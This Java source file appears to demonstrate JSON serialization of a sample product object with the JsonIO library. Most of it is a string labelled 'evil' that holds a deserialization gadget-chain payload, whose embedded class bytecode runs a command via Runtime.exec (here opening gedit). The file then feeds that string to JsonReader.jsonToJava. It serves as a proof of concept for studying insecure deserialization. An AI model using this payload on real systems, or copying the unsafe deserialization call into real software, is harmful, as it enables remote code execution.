package com.company;

import com.cedarsoftware.util.io.JsonReader;
import com.cedarsoftware.util.io.JsonWriter;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.beans.XMLEncoder;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;

public class SerializeProduct {

    private static final String SERIALIZED_FILE_NAME = "product.json";

    public static void main(String[] args) {

        Category electro = new Category("Electro");
        Category smartphone = new Category("Smartphone");
        smartphone.setParent(electro);

        Product iphoneX = new Product("Apple Iphone X", 1199.99f, "Make all your friends jealous.", "images/products/IphoneX.jpg", smartphone);

        /*
        * JsonIO
        * */

        String marshalled = JsonWriter.objectToJson(iphoneX);

        System.out.println(marshalled);

        //unmarshall

        String evil = "{\"@type\":\"java.util.Arrays$ArrayList\",\"@items\":[{\"@id\":1,\"@type\":\"com.rometools.rome.feed.impl.EqualsBean\",\"beanClass\":\"com.rometools.rome.feed.impl.ToStringBean\",\"obj\":{\"@type\":\"com.rometools.rome.feed.impl.ToStringBean\",\"beanClass\":\"javax.xml.transform.Templates\",\"obj\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_tfactory\": {\"@type\" : \"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\"},\"_name\":\"Pwnr\",\"_bytecodes\":[[-54,-2,-70,-66,0,0,0,52,0,61,10,0,3,0,34,7,0,59,7,0,37,7,0,38,1,0,16,115,101,114,105,97,108,86,101,114,115,105,111,110,85,73,68,1,0,1,74,1,0,13,67,111,110,115,116,97,110,116,86,97,108,117,101,5,-83,32,-109,-13,-111,-35,-17,62,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,18,76,111,99,97,108,86,97,114,105,97,98,108,101,84,97,98,108,101,1,0,4,116,104,105,115,1,0,19,83,116,117,98,84,114,97,110,115,108,101,116,80,97,121,108,111,97,100,1,0,12,73,110,110,101,114,67,108,97,115,115,101,115,1,0,54,76,109,97,114,115,104,97,108,115,101,99,47,103,97,100,103,101,116,115,47,84,101,109,112,108,97,116,101,115,85,116,105,108,36,83,116,117,98,84,114,97,110,115,108,101,116,80,97,121,108,111,97,100,59,1,0,9,116,114,97,110,115,102,111,114,109,1,0,114,40,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,68,79,77,59,91,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,115,101,114,105,97,108,105,122,101,114,47,83,101,114,105,97,108,105,122,97,116,105,111,110,72,97,110,100,108,101,114,59,41,86,1,0,8,100,111,99,117,109,101,110,116,1,0,45,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,68,79,77,59,1,0,8,104,97,110,100,108,101,114,115,1,0,66,91,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,115,101,114,105,97,108,105,122,101,114,47,83,101,114,105,97,108,105,122,97,116,105,111,110,72,97,110,100,108,101,114,59,1,0,10,69,120,99,101,112,116,105,111,110,115,7,0,39,1,0,-90,40,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,68,79,77,59,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,100,116,109,47,68,84,77,65,120,105,115,73,116,101,114,97,116,111,114,59,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,115,101,114,105,97,108,105,122,101,114,47,83,101,114,105,97,108,105,122,97,116,105,111,110,72,97,110,100,108,101,114,59,41,86,1,0,8,105,116,101,114,97,116,111,114,1,0,53,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,100,116,109,47,68,84,77,65,120,105,115,73,116,101,114,97,116,111,114,59,1,0,7,104,97,110,100,108,101,114,1,0,65,76,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,109,108,47,105,110,116,101,114,110,97,108,47,115,101,114,105,97,108,105,122,101,114,47,83,101,114,105,97,108,105,122,97,116,105,111,110,72,97,110,100,108,101,114,59,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,18,84,101,109,112,108,97,116,101,115,85,116,105,108,46,106,97,118,97,12,0,10,0,11,7,0,40,1,0,52,109,97,114,115,104,97,108,115,101,99,47,103,97,100,103,101,116,115,47,84,101,109,112,108,97,116,101,115,85,116,105,108,36,83,116,117,98,84,114,97,110,115,108,101,116,80,97,121,108,111,97,100,1,0,64,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,114,117,110,116,105,109,101,47,65,98,115,116,114,97,99,116,84,114,97,110,115,108,101,116,1,0,20,106,97,118,97,47,105,111,47,83,101,114,105,97,108,105,122,97,98,108,101,1,0,57,99,111,109,47,115,117,110,47,111,114,103,47,97,112,97,99,104,101,47,120,97,108,97,110,47,105,110,116,101,114,110,97,108,47,120,115,108,116,99,47,84,114,97,110,115,108,101,116,69,120,99,101,112,116,105,111,110,1,0,32,109,97,114,115,104,97,108,115,101,99,47,103,97,100,103,101,116,115,47,84,101,109,112,108,97,116,101,115,85,116,105,108,1,0,8,60,99,108,105,110,105,116,62,1,0,17,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,7,0,42,1,0,10,103,101,116,82,117,110,116,105,109,101,1,0,21,40,41,76,106,97,118,97,47,108,97,110,103,47,82,117,110,116,105,109,101,59,12,0,44,0,45,10,0,43,0,46,1,0,16,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,7,0,48,1,0,14,47,117,115,114,47,98,105,110,47,103,101,100,105,116,8,0,50,1,0,8,47,116,109,112,47,102,111,111,8,0,52,1,0,4,101,120,101,99,1,0,40,40,91,76,106,97,118,97,47,108,97,110,103,47,83,116,114,105,110,103,59,41,76,106,97,118,97,47,108,97,110,103,47,80,114,111,99,101,115,115,59,12,0,54,0,55,10,0,43,0,56,1,0,13,83,116,97,99,107,77,97,112,84,97,98,108,101,1,0,28,121,115,111,115,101,114,105,97,108,47,80,119,110,101,114,50,49,56,51,50,56,49,55,55,52,53,55,52,1,0,30,76,121,115,111,115,101,114,105,97,108,47,80,119,110,101,114,50,49,56,51,50,56,49,55,55,52,53,55,52,59,0,33,0,2,0,3,0,1,0,4,0,1,0,26,0,5,0,6,0,1,0,7,0,0,0,2,0,8,0,4,0,1,0,10,0,11,0,1,0,12,0,0,0,47,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,2,0,13,0,0,0,6,0,1,0,0,0,40,0,14,0,0,0,12,0,1,0,0,0,5,0,15,0,60,0,0,0,1,0,19,0,20,0,2,0,12,0,0,0,63,0,0,0,3,0,0,0,1,-79,0,0,0,2,0,13,0,0,0,6,0,1,0,0,0,46,0,14,0,0,0,32,0,3,0,0,0,1,0,15,0,60,0,0,0,0,0,1,0,21,0,22,0,1,0,0,0,1,0,23,0,24,0,2,0,25,0,0,0,4,0,1,0,26,0,1,0,19,0,27,0,2,0,12,0,0,0,73,0,0,0,4,0,0,0,1,-79,0,0,0,2,0,13,0,0,0,6,0,1,0,0,0,50,0,14,0,0,0,42,0,4,0,0,0,1,0,15,0,60,0,0,0,0,0,1,0,21,0,22,0,1,0,0,0,1,0,28,0,29,0,2,0,0,0,1,0,30,0,31,0,3,0,25,0,0,0,4,0,1,0,26,0,8,0,41,0,11,0,1,0,12,0,0,0,48,0,6,0,2,0,0,0,27,-89,0,3,1,76,-72,0,47,5,-67,0,49,89,3,18,51,83,89,4,18,53,83,-74,0,57,87,-79,0,0,0,1,0,58,0,0,0,3,0,1,3,0,2,0,32,0,0,0,2,0,33,0,17,0,0,0,10,0,1,0,2,0,35,0,16,0,9],[-54,-2,-70,-66,0,0,0,52,0,27,10,0,3,0,21,7,0,23,7,0,24,7,0,25,1,0,16,115,101,114,105,97,108,86,101,114,115,105,111,110,85,73,68,1,0,1,74,1,0,13,67,111,110,115,116,97,110,116,86,97,108,117,101,5,113,-26,105,-18,60,109,71,24,1,0,6,60,105,110,105,116,62,1,0,3,40,41,86,1,0,4,67,111,100,101,1,0,15,76,105,110,101,78,117,109,98,101,114,84,97,98,108,101,1,0,18,76,111,99,97,108,86,97,114,105,97,98,108,101,84,97,98,108,101,1,0,4,116,104,105,115,1,0,3,70,111,111,1,0,12,73,110,110,101,114,67,108,97,115,115,101,115,1,0,38,76,109,97,114,115,104,97,108,115,101,99,47,103,97,100,103,101,116,115,47,84,101,109,112,108,97,116,101,115,85,116,105,108,36,70,111,111,59,1,0,10,83,111,117,114,99,101,70,105,108,101,1,0,18,84,101,109,112,108,97,116,101,115,85,116,105,108,46,106,97,118,97,12,0,10,0,11,7,0,26,1,0,36,109,97,114,115,104,97,108,115,101,99,47,103,97,100,103,101,116,115,47,84,101,109,112,108,97,116,101,115,85,116,105,108,36,70,111,111,1,0,16,106,97,118,97,47,108,97,110,103,47,79,98,106,101,99,116,1,0,20,106,97,118,97,47,105,111,47,83,101,114,105,97,108,105,122,97,98,108,101,1,0,32,109,97,114,115,104,97,108,115,101,99,47,103,97,100,103,101,116,115,47,84,101,109,112,108,97,116,101,115,85,116,105,108,0,33,0,2,0,3,0,1,0,4,0,1,0,26,0,5,0,6,0,1,0,7,0,0,0,2,0,8,0,1,0,1,0,10,0,11,0,1,0,12,0,0,0,47,0,1,0,1,0,0,0,5,42,-73,0,1,-79,0,0,0,2,0,13,0,0,0,6,0,1,0,0,0,54,0,14,0,0,0,12,0,1,0,0,0,5,0,15,0,18,0,0,0,2,0,19,0,0,0,2,0,20,0,17,0,0,0,10,0,1,0,2,0,22,0,16,0,9]],\"_class\":null,\"_transletIndex\":-1,\"_auxClasses\":null,\"_outputProperties\":null,\"_indentNumber\":0,\"_useServicesMechanism\":false,\"_accessExternalStylesheet\":\"all\"}}},{\"@type\":\"java.util.HashMap\",\"@keys\":[{\"@ref\":1},{\"@ref\":1}],\"@items\":[{\"@ref\":1},{\"@ref\":1}]}]}";

        JsonReader.jsonToJava(evil);

//        System.out.println(p1.toString());


        /*
        Jackson
         */

//        ObjectMapper mapper = new ObjectMapper();

//        //Object to JSON in file
//        try{
//            mapper.writeValue(new File(SERIALIZED_FILE_NAME), iphoneX);
//        }
//        catch (java.io.IOException e){
//            System.out.println("ERROR: While Creating or Opening the File product.json");
//        }

        //Object to JSON in String
//        try{
//            System.out.println(mapper.writeValueAsString(iphoneX));
//        }
//        catch (JsonProcessingException e){
//            System.out.println("ERROR: ProcessingException");
//        }

        /*
        XMLEncoder:
         */
//        XMLEncoder encoder = null;
//        try{
//            encoder = new XMLEncoder(new BufferedOutputStream(new FileOutputStream(SERIALIZED_FILE_NAME)));
//        }
//        catch (FileNotFoundException fileNotFound){
//            System.out.println("ERROR: While Creating or Opening the File product.xml");
//        }
//        encoder.writeObject(iphoneX);
//        encoder.close();
    }

}
